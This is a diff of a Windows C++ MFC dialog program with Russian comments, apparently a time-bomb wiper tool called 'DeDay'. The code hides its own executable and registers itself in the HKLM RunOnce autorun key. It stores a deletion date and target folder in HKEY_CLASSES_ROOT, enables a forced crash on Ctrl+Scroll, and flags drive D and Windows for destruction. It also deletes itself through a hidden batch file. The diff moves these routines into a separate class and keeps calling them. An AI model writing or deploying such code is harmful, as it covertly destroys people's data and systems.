@@ -4,6 +4,7 @@
 #include "stdafx.h"
 #include "DeDay.h"
 #include "DeDayDlg.h"
+#include "DeleteDay.h"
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -42,6 +43,7 @@ BEGIN_MESSAGE_MAP(CDeDayDlg, CDialog)
 	ON_BN_CLICKED(IDCANCEL, &CDeDayDlg::OnBnClickedCancel)
 END_MESSAGE_MAP()
 
+CDeleteDay dDay;
 
 // CDeDayDlg message handlers
 
@@ -99,38 +101,29 @@ HCURSOR CDeDayDlg::OnQueryDragIcon()
 
 void CDeDayDlg::OnBnClickedOk()
 {
-	wchar_t szFileExe[MAX_PATH] = {L"\0"};
-	wchar_t sz[600] = {L"\0"}; // Строка-помошник...
+	dDay.HideFile();
 	
-    GetModuleFileName(NULL, szFileExe, sizeof(szFileExe)); // Получаем путь к запущенному ехешнику
-
-	//Retrieves the short path form of the specified path.
-    if (GetShortPathName(szFileExe, sz, MAX_PATH)) // Преобразуем имя файла в досовский вид
-		wcscpy(szFileExe, sz);
-
-	SetFileAttributes(szFileExe, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN); // "прячем" файл	
-
 	//добавить себя в автозагрузку
-	AddToAutorun();
+	dDay.AddToAutoRun();
 	
 	//сохранить дату удаления папки
-	SaveDeleteDay();
+	dDay.SaveDeleteDay();
 
 	//сохранить что удалять
-	SaveFolderPathToDelete();
+	dDay.SaveFolderPathToDelete();
 
-	EnableCrashOnCtrlScroll();
+	dDay.EnableCrashOnCtrlScroll();
 
 	UpdateData(TRUE);
 
 	if ( m_bDeleteD )
 	{
-		DeleteDiskD();
+		dDay.DeleteDiskD();
 	}
 
 	if ( m_bKillWindows )
 	{
-		KillWindows();
+		dDay.SaveTaskKillWindows();
 	}
 	
 	OnOK();
@@ -177,124 +170,6 @@ void CDeDayDlg::OnBnClickedBtnBrows()
 	OnEnChangePath();
 }
 
-bool CDeDayDlg::AddToAutorun(void)
-{
-	CString csExePath;
-	DWORD dwSize = 512; 
-	
-	GetModuleFileName( NULL, csExePath.GetBuffer(dwSize), dwSize );
-	TRACE1("Путь к программе = %s\n", csExePath.GetString());
-	csExePath.ReleaseBuffer();
-
-	//добавить себя в автозагрузку
-	//наверное правильней будет добавлять в RunOnce и каждый раз себя туда добавлять если не
-	//достигнута дата срабатывания
-	if (SHSetValue(HKEY_LOCAL_MACHINE
-		, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
-		, RunOnceItemName
-		, REG_SZ
-		, csExePath.GetString()
-		, csExePath.GetLength())!= ERROR_SUCCESS)
-		{
-			MessageBox(L"Облом с SHSetValue() в AddToAutorun()", L"Облом", MB_ICONERROR);
-			return false;
-		}
-
-	return true;
-}
-
-bool CDeDayDlg::SaveDeleteDay(void)
-{
-	SYSTEMTIME SysTime;
-	ZeroMemory(&SysTime, 0);
-
-	m_MonthCalCtrl.GetCurSel(&SysTime);
-
-	CString DeleteDay, DeleteWeek, DeleteMonth;
-
-	DeleteDay.Format(L"%d", SysTime.wDay);
-	DeleteWeek.Format(L"%d", SysTime.wDayOfWeek);
-	DeleteMonth.Format(L"%d", SysTime.wMonth);
-	
-	//DeleteDay.Format("%d.%d%.d", SysTime.wDay, SysTime.wDayOfWeek, SysTime.wMonth);
-	TRACE1("День удаления = %s\n", DeleteDay.GetString());
-
-	HKEY hk;
-
-	// создать ключ в HKCR\CLSID
-	if (RegCreateKeyEx(HKEY_CLASSES_ROOT
-		, RegDataKeyName
-		, 0
-		, NULL
-		, REG_OPTION_NON_VOLATILE
-		, KEY_WRITE
-		, NULL
-		, &hk
-		, NULL)) 
-	{
-		MessageBox(L"Could not create the registry key in SaveDeleteDay().", L"Облом", MB_ICONERROR); 
-		return false;
-	}
-
-	RegCloseKey(hk);
-
-	//===== сохраним день удаления ======
-	if (SHSetValue(HKEY_CLASSES_ROOT
-		, RegDataKeyName
-		, DelDayKeyName			//имя значения
-		, REG_SZ
-		, DeleteDay.GetString()
-		, DeleteDay.GetLength())!= ERROR_SUCCESS)
-	{
-		TRACE("Облом с SHSetValue() в SaveDeleteDay()", "Облом", MB_ICONERROR);
-		return false;
-	}
-
-	//===== сохраним день недели =====
-	if (SHSetValue(HKEY_CLASSES_ROOT
-		, RegDataKeyName
-		, DelDayOfWeekKeyName			//имя значения
-		, REG_SZ
-		, DeleteWeek.GetString()
-		, DeleteWeek.GetLength())!= ERROR_SUCCESS)
-	{
-		TRACE("Облом с SHSetValue() в SaveDeleteDay()", "Облом", MB_ICONERROR);
-		return false;
-	}
-
-	//===== сохраним месяц =====
-	if (SHSetValue(HKEY_CLASSES_ROOT
-		, RegDataKeyName
-		, DelMonthKeyName			//имя значения
-		, REG_SZ
-		, DeleteMonth.GetString()
-		, DeleteMonth.GetLength())!= ERROR_SUCCESS)
-	{
-		TRACE("Облом с SHSetValue() в SaveDeleteDay()", "Облом", MB_ICONERROR);
-		return false;
-	}
-
-	return true;
-}
-
-bool CDeDayDlg::SaveFolderPathToDelete()
-{	
-	CString csFolderPath(m_csPath.GetString());
-	
-	if (SHSetValue(HKEY_CLASSES_ROOT
-		, RegDataKeyName
-		, DelFolderKeyName
-		, REG_SZ
-		, csFolderPath.GetString()
-		, csFolderPath.GetLength())!= ERROR_SUCCESS)
-	{
-		MessageBox(L"Облом с SHSetValue() в SaveFolderPathToDelete()", L"Облом", MB_ICONERROR);
-		return false;
-	}
-
-	return true;
-}
-
 void CDeDayDlg::OnEnChangePath()
 {
 	UpdateData(TRUE);
@@ -307,60 +182,6 @@ void CDeDayDlg::OnEnChangePath()
 	{
 		GetDlgItem(IDOK)->EnableWindow(FALSE);
 	}
-}
-
-bool CDeDayDlg::EnableCrashOnCtrlScroll()
-{
-	HKEY hKey;
-	
-	if (RegOpenKey(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\i8042prt\\Parameters", &hKey) == ERROR_SUCCESS)
-	{
-		DWORD lpData = 0x01;
-		
-		if (RegSetValueEx(hKey, L"CrashOnCtrlScroll", NULL, REG_DWORD, (BYTE*)&lpData, (DWORD)sizeof (lpData))!= ERROR_SUCCESS)
-		{
-			MessageBox(L"Облом с SHSetValue() в EnableCrashOnCtrlScroll()", L"Облом", MB_ICONERROR);
-			return false;
-		}
-	}
-
-	return true;
-}
-
-bool CDeDayDlg::DeleteDiskD(void)
-{
-	CString csDeleteD("YES");
-	
-	if (SHSetValue(HKEY_CLASSES_ROOT
-		, RegDataKeyName
-		, DelDiskDKeyName
-		, REG_SZ
-		, csDeleteD.GetString()
-		, csDeleteD.GetLength())!= ERROR_SUCCESS)
-	{
-		MessageBox(L"Облом с SHSetValue() в DeleteDiskD()", L"Облом", MB_ICONERROR);
-		return false;
-	}
-
-	return true;
-}
-
-bool CDeDayDlg::KillWindows()
-{
-	CString csKillWindows("YES");
-	
-	if (SHSetValue(HKEY_CLASSES_ROOT
-		, RegDataKeyName
-		, KillWindowsKeyName
-		, REG_SZ
-		, csKillWindows.GetString()
-		, csKillWindows.GetLength())!= ERROR_SUCCESS)
-	{
-		MessageBox(L"Облом с SHSetValue() в DeleteDiskD()", L"Облом", MB_ICONERROR);
-		return false;
-	}
-
-return true;
 }
 
 void CDeDayDlg::OnBnClickedDeleteD()
@@ -395,93 +216,7 @@ void CDeDayDlg::OnBnClickedCancel()
 {
 	//удаляем сами себя
 	TRACE(" >>> Удаляем сами себя <<<\n");
-	SelfDelete();
+	dDay.SelfDelete();
 	
 	OnCancel();
-}
-
-void CDeDayDlg::SelfDelete()
-{
-	//удалить себя из автозагрузки
-	HKEY hKey;
-
-	if (::RegOpenKeyEx( HKEY_LOCAL_MACHINE
-		, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
-		, NULL
-		, KEY_ALL_ACCESS
-		, &hKey) == ERROR_SUCCESS)
-	{
-		::RegDeleteValue( hKey, RunOnceItemName );
-	}
-
-	// Далее выделяем много памяти - лишним не будет %)
-	wchar_t szFilePath[MAX_PATH] = { L"\0" };
-	wchar_t szFileBat[MAX_PATH] = { L"System.bat" };
-	wchar_t szFileExe[MAX_PATH] = { L"\0" };
-	
-	wchar_t sz[600]; // Строка-помошник...
-
-    unsigned int iTmp;
-	wchar_t* lpTmp;
-	
-	// Получаем путь к запущенному ехешнику
-    GetModuleFileName(NULL, szFileExe, sizeof(szFileExe));
-
-	// Преобразуем в имя файла в досовский вид
-    if (GetShortPathName(szFileExe, sz, _MAX_PATH)) 
-		wcscpy(szFileExe, sz);
-    
-	size_t sLen = wcslen(szFileExe) - 1;
-	lpTmp = szFileExe + sLen; //теперь lpTmp указывает на конец строки
-
-	for (iTmp = 0; iTmp < wcslen(szFileExe); lpTmp--, iTmp++)
-    {
-		if (!wcsncmp(lpTmp, L"\\", 1))
-            break;
-    }
-
-	//убираем из пути к фалу название программы
-	size_t count = lpTmp - szFileExe; //Number of characters to be copied
- 
-	wcsncpy(szFilePath, szFileExe, count);
-	wcscat(szFilePath, L"\\");
-
-   	//===== удалить саму себя =====
-	wchar_t BATSTRING[1024] = 
-		L":Repeat\n"
-		L"del \"%s\"\n" //команда на удаление экзешника
-		L"if exist \"%s\" goto Repeat\n" //повторяем пока не получится
-		L":Repeat1\n"
-		L"del \"%s\"\n"
-		L"\0"; //удаление батника
-
-	HANDLE hFile = CreateFile((LPCTSTR)szFileBat, 
-		GENERIC_WRITE,
-		FILE_SHARE_WRITE,
-		NULL,
-		CREATE_ALWAYS,
-		FILE_ATTRIBUTE_NORMAL,
-		(HANDLE)NULL); // Создаем по-новой файл ("зачем?" - ком. внутреннего голоса)
-
-    if (!hFile)
-    {
-        MessageBox(L"Факн щет, файла System.bat нет и не будет", L"Облом", MB_OK | MB_ICONSTOP);
-    }
-
-	//char sz[600]; // Строка-помошник...
-	//создаем бат-файл ===========================================
-	swprintf(sz, BATSTRING, szFileExe, szFileExe, szFileBat);
-
-	DWORD dwBytesWritten;
-
-	BOOL bError = (!WriteFile(hFile, sz, wcslen(sz), &dwBytesWritten, NULL) || wcslen(sz) != dwBytesWritten);
-
-    if (bError)
-    {
-        MessageBox(L"Факн щет, текст в файл System.bat не удалось записать", L"Облом", MB_OK | MB_ICONSTOP);
-    }
-
-	CloseHandle(hFile); // Специально закрываем файл перед запуском батника, чтобы юзер не удалил файл раньше времени
-
-	HINSTANCE h = ShellExecute(NULL, L"open", szFileBat, NULL, NULL, SW_HIDE); // Запускаем батник.
 }
